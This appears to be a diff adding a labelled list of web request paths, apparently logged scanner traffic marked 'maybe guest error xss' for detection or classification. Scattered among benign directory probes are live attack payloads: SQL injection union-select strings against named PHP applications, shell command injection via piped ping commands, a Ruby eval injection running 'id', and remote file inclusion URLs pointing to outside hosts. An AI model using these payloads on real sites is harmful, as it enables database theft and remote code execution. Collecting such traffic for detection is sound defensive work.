@@ -1,0 +1,402 @@
+maybe guest error xss /iconloading/
+
+maybe guest error xss /index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1331908730,1,1,1,1,1,1,1--&blogid=1
+
+maybe guest error xss /nw msn alerts/
+
+maybe guest error xss /index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331919200,0x3a,512612977),3,4,5,6,7,8,9,10,11,12,13,14,15,16
+
+maybe guest error xss /javascript/alerts.java
+
+maybe guest error xss /javascript/alert.pm
+
+maybe guest error xss /javascript/alerts.rb
+
+maybe guest error xss /cgi-bin/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1331919223,1,795710224--
+
+maybe guest error xss /javascript/alerts.vbs
+
+maybe guest error xss /0,,1710249,00/
+
+maybe guest error xss /main.php?stuff=|ping,-w,8000,-n,1,4.3.2.1|rem,
+
+maybe guest error xss /cgi-bin/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1331923205,1,131076807--
+
+maybe guest error xss /alertrightside/
+
+maybe guest error xss /javascript/alert.sfish
+
+maybe guest error xss /javascript/alert.gz
+
+maybe guest error xss /cprompt/
+
+maybe guest error xss /evalrequest/
+
+maybe guest error xss /javascript/alert.ini
+
+maybe guest error xss /ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 2020390524,2,880987929,4,5,6,7,8,9,0,1,2,3 --
+
+maybe guest error xss /0,2627,0201745755,00/
+
+maybe guest error xss /examples/jsp/cal/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 1114106,2,907689688,4,5,6,7,8,9,0,1,2,3 --
+
+maybe guest error xss /impromptus/
+
+maybe guest error xss /vpdevalum/
+
+maybe guest error xss /examples/jsp/num/spt--forumtopics.php?forumid=-9 union select null,null,null,1331904462,4,5
+
+maybe guest error xss /examples/jsp/checkbox/forum.php?forum=-1 union select null,123456,null,null,null,null--
+
+maybe guest error xss /cgi-bin/spt--forumtopics.php?forumid=-9 union select null,null,null,1331908887,4,5
+
+maybe guest error xss /cgi-bin/index.php?act=sm_window&page=event&day=-1 union select 1,1331919215,1990011133 --
+
+maybe guest error xss /ealert080706/
+
+maybe guest error xss /cgi-bin/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 1974863202,2,2009798962,4,5,6,7,8,9,0,1,2,3 --
+
+maybe guest error xss /security_alerts/
+
+maybe guest error xss /index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1332008331,0x3a,892071098),3,4,5,6,7,8,9,10,11,12,13,14,15,16
+
+maybe guest error xss /cgi-bin/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 362784712,2,1572590489,4,5,6,7,8,9,0,1,2,3 --
+
+maybe guest error xss /examples/jsp/error/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,720432920543,4,5,6,7,8,9,10,11--
+
+maybe guest error xss /evalltr/
+
+maybe guest error xss /ealert88/
+
+maybe guest error xss /javascript/alert.rss
+
+maybe guest error xss /exhibit%2011/
+
+maybe guest error xss /eval_help/
+
+maybe guest error xss /free30dayeval/
+
+maybe guest error xss /alert1/
+
+maybe guest error xss /caralert/
+
+maybe guest error xss /alert_manager/
+
+maybe guest error xss /examples/jsp/error/api/orders.json?search[instance_eval]=kernel.fail `id`
+
+maybe guest error xss /2004alert64/
+
+maybe guest error xss /help.php?q=ping,-w,11000,-n,1,4.3.2.1|rem,
+
+maybe guest error xss /evaluation_committee/
+
+maybe guest error xss /index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1331919003,1,1,1,1,1,1,1--&blogid=1
+
+maybe guest error xss /examples/jsp/jsp2/jspx/index.php?act=sm_window&page=event&day=-1 union select 1,1331904452,941315700 --
+
+maybe guest error xss /javascript/alerts.shtml
+
+maybe guest error xss /alertleftside/
+
+maybe guest error xss /javascript/alert.rtf
+
+maybe guest error xss /cgevallx/
+
+maybe guest error xss /alerttitleblank/
+
+maybe guest error xss /examples/jsp/num/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1331904462,1,470960381--
+
+maybe guest error xss /examples/jsp/checkbox/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,573614927975,4,5,6,7,8,9,10,11--
+
+maybe guest error xss /alert-r0/
+
+maybe guest error xss /cdsagenda/modification/sendalertemail.php?age=http://192.168.202.118:8080/tzhfyzkbomspvm??
+
+maybe guest error xss /exhibit%2020/
+
+maybe guest error xss /cgi-bin/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,723399913286,4,5,6,7,8,9,10,11--
+
+maybe guest error xss /javascript/alert.temp
+
+maybe guest error xss /index.php?act=sm_window&page=event&day=-1 union select 1,1331923203,932914702 --
+
+maybe guest error xss /help.php?q=&ping,-w,8000,-n,1,1.2.3.4&rem,
+
+maybe guest error xss /feature_alerts/
+
+maybe guest error xss /consumer_alerts/
+
+maybe guest error xss /mcalerts/
+
+maybe guest error xss /alert-center/
+
+maybe guest error xss /exhibit%204-17/
+
+maybe guest error xss /en-us/account/spt--forumtopics.php?forumid=-9 union select null,null,null,1331905234,4,5
+
+maybe guest error xss /nav_alerts/
+
+maybe guest error xss /alertdetail/
+
+maybe guest error xss /nt_evaluation/
+
+maybe guest error xss /javascript/alert.jsf
+
+maybe guest error xss /apache_alert/
+
+maybe guest error xss /medieval-2/
+
+maybe guest error xss /examples/jsp/num/index.php?act=sm_window&page=event&day=-1 union select 1,1331904452,1134427173 --
+
+maybe guest error xss /cgi-bin/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331908854,0x3a,1781864537),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+
+maybe guest error xss /examples/servlets/servlet/index.php?act=sm_window&page=event&day=-1 union select 1,1331904452,1415329595 --
+
+maybe guest error xss /virusalerts/
+
+maybe guest error xss /howtoevaluatenew/
+
+maybe guest error xss /examples/jsp/colors/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,093611555975,4,5,6,7,8,9,10,11--
+
+maybe guest error xss /cgi-bin/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 854943738,2,566710091,4,5,6,7,8,9,0,1,2,3 --
+
+maybe guest error xss /alert20033/
+
+maybe guest error xss /index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,184920009168,4,5,6,7,8,9,10,11--
+
+maybe guest error xss /evalhealthinfo/
+
+maybe guest error xss /javascriptprompt2asdf234adfadfa34asf_small/
+
+maybe guest error xss /javascript/alerts.error
+
+maybe guest error xss /medievalconquestv1/
+
+maybe guest error xss /index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1332009306,0x3a,1514709258),3,4,5,6,7,8,9,10,11,12,13,14,15,16
+
+maybe guest error xss /contrib/forms/evaluation/c_formevaluation.class.php?globals[fileroot]=http://192.168.202.96:8080/llumt7msyau5y?
+
+maybe guest error xss /2003alert57/
+
+maybe guest error xss /index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0,1,203712303,473923447,1,1,1,1,1--&blogid=1
+
+maybe guest error xss /plsextproc_alert/
+
+maybe guest error xss /javascript/alert.class
+
+maybe guest error xss /recordings/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1331919003,1,1,1,1,1,1,1--&blogid=1
+
+maybe guest error xss /examples/servlets/servlet/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 1161517009,2,1674610116,4,5,6,7,8,9,0,1,2,3 --
+
+maybe guest error xss /index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1331908862,1,1,1,1,1,1,1--&blogid=1
+
+maybe guest error xss /main.php?stuff=|ping,-w,10000,-n,1,1.2.3.4|rem,
+
+maybe guest error xss /shoresidevale/
+
+maybe guest error xss /exchange_evaluation/
+
+maybe guest error xss /tvcalert/
+
+maybe guest error xss /alert phone_information/
+
+maybe guest error xss /examples/jsp/cal/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331904437,0x3a,504398662),3,4,5,6,7,8,9,10,11,12,13,14,15,16
+
+maybe guest error xss /top.php?stuff=ping,-w,8000,-n,1,4.3.2.1&rem,
+
+maybe guest error xss /phpmyadmin/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 1161517009,2,1674610116,4,5,6,7,8,9,0,1,2,3 --
+
+maybe guest error xss /alert_news/
+
+maybe guest error xss /manager/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331904437,0x3a,577347075),3,4,5,6,7,8,9,10,11,12,13,14,15,16
+
+maybe guest error xss /redalerttheaftermathnocd/
+
+maybe guest error xss /exhibit%203/
+
+maybe guest error xss /qihoo%20logo-tm/
+
+maybe guest error xss /javascript/alerts.html
+
+maybe guest error xss /2003alert61/
+
+maybe guest error xss /javascript/alert.sh
+
+maybe guest error xss /manager/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0,1,311692537,1573465944,1,1,1,1,1--&blogid=1
+
+maybe guest error xss /alert0004/
+
+maybe guest error xss /top.php?stuff=&ping,-w,11000,-n,1,4.3.2.1&rem,
+
+maybe guest error xss /evalbum/
+
+maybe guest error xss /eval_yahoowebservices/
+
+maybe guest error xss /alert 20046/
+
+maybe guest error xss /index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,051041522030,4,5,6,7,8,9,10,11--
+
+maybe guest error xss /javascript/alert.xsl
+
+maybe guest error xss /top.php?stuff=|ping,-w,8000,-n,1,4.3.2.1|rem,
+
+maybe guest error xss /examples/jsp/colors/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331904437,0x3a,577347075),3,4,5,6,7,8,9,10,11,12,13,14,15,16
+
+maybe guest error xss /javascript/alert.nsf
+
+maybe guest error xss /cdsagenda/modification/sendalertemail.php?age=http://192.168.202.118:8080/iroy1gvqrrqu??
+
+maybe guest error xss /javascript/alerts.zip
+
+maybe guest error xss //q47417758%26q6971%22q6971%3cq6971%3eq47417758
+
+maybe guest error xss /quickevalid/
+
+maybe guest error xss /admin/autoprompter.php?config[base_path]=http://192.168.202.96:8080/whmch8ftkt7kv?
+
+maybe guest error xss /dbsnmp_alert/
+
+maybe guest error xss /0,1697,1125674,00/
+
+maybe guest error xss /scipalert_menu/
+
+maybe guest error xss /index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1332010397,0x3a,1301577513),3,4,5,6,7,8,9,10,11,12,13,14,15,16
+
+maybe guest error xss /main.php?stuff=ping,-w,8000,-n,1,1.2.3.4&rem,
+
+maybe guest error xss /alert20063/
+
+maybe guest error xss /main.php?stuff=ping,-w,8000,-n,1,4.3.2.1&rem,
+
+maybe guest error xss /index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,087618615219,4,5,6,7,8,9,10,11--
+
+maybe guest error xss /systemalerts/
+
+maybe guest error xss /showevaluateemail/
+
+maybe guest error xss /effialert/
+
+maybe guest error xss /0,10117,15891104-13762,00/
+
+maybe guest error xss /virusalertd/
+
+maybe guest error xss /alert-services/
+
+maybe guest error xss /index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,706187344943,4,5,6,7,8,9,10,11--
+
+maybe guest error xss /help.php?q=ping,-w,10000,-n,1,1.2.3.4&rem,
+
+maybe guest error xss /precisionalertentry/
+
+maybe guest error xss /action-alerts/
+
+maybe guest error xss /cgi-bin/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 996551295,2,294567145,4,5,6,7,8,9,0,1,2,3 --
+
+maybe guest error xss /examples/jsp/jsp2/el/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1331904462,1,2005025687--
+
+maybe guest error xss /alert_gw/
+
+maybe guest error xss /main.php?stuff=ping,-w,10000,-n,1,1.2.3.4|rem,
+
+maybe guest error xss /death_alert/
+
+maybe guest error xss /copias y herramientas de dvd,divx,cd,vcd/
+
+maybe guest error xss /javascript/alerts.tmp
+
+maybe guest error xss /examples/jsp/colors/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1331904442,1,1,1,1,1,1,1--&blogid=1
+
+maybe guest error xss /javascript/alert.stackdump
+
+maybe guest error xss /readpreprompt/
+
+maybe guest error xss /order_eval1/
+
+maybe guest error xss /re_evaluating/
+
+maybe guest error xss /prompt-magic/
+
+maybe guest error xss /javascript/alert.conf
+
+maybe guest error xss /dumpfile_alert/
+
+maybe guest error xss /alert_66/
+
+maybe guest error xss /box_alertes/
+
+maybe guest error xss /usb evaluation utility_information/
+
+maybe guest error xss /generalsbushlevelheadedinevaluatingiraqpolicy/
+
+maybe guest error xss /exhibit%2026/
+
+maybe guest error xss /help.php?q=ping,-w,11000,-n,1,1.2.3.4&rem,
+
+maybe guest error xss /emergency-alerts/
+
+maybe guest error xss /phpmyadmin/spt--forumtopics.php?forumid=-9 union select null,null,null,1331904462,4,5
+
+maybe guest error xss /examples/jsp/error/forum.php?forum=-1 union select null,123456,null,null,null,null--
+
+maybe guest error xss /cdsagenda/modification/sendalertemail.php?age=@rfiurl?age=@rfiurl?
+
+maybe guest error xss /screen_callalert/
+
+maybe guest error xss /myalertsummary/
+
+maybe guest error xss /section_getalerts/
+
+maybe guest error xss /phpmyadmin/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331923200,0x3a,196871378),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+
+maybe guest error xss /healthalerts/
+
+maybe guest error xss /evalworksheet/
+
+maybe guest error xss /cgi-bin/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1332009308,1,1919064263--
+
+maybe guest error xss /downloadtheevaluationeditionoverview/
+
+maybe guest error xss /news_alerts/
+
+maybe guest error xss /opensslalert/
+
+maybe guest error xss /linux-alerts/
+
+maybe guest error xss /help.php?q=&ping,-w,7000,-n,1,1.2.3.4&rem,
+
+maybe guest error xss /060627-vista_prompts/
+
+maybe guest error xss /kalevala/
+
+maybe guest error xss /2003alert52/
+
+maybe guest error xss /one-alert/
+
+maybe guest error xss /0,4586,2607716,00/
+
+maybe guest error xss /fraud_monsterfraudalertviaemail/
+
+maybe guest error xss /load-alerts/
+
+maybe guest error xss /javascript/alerts.so
+
+maybe guest error xss /oem_alert/
+
+maybe guest error xss /help.php?q=|ping,-w,7000,-n,1,1.2.3.4|rem,
+
+maybe guest error xss /manager/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 1161517009,2,1674610116,4,5,6,7,8,9,0,1,2,3 --
+
+maybe guest error xss /javascript/alert.ppt
+
+maybe guest error xss /alert2ol/
+
+maybe guest error xss /ealert100206/
+
+maybe guest error xss /lalert/
+
+maybe guest error xss /ealert072406/
+
+maybe guest error xss //q32152879%26q1741%22q1741%3cq1741%3eq32152879
+
+maybe guest error xss /alerts/
+
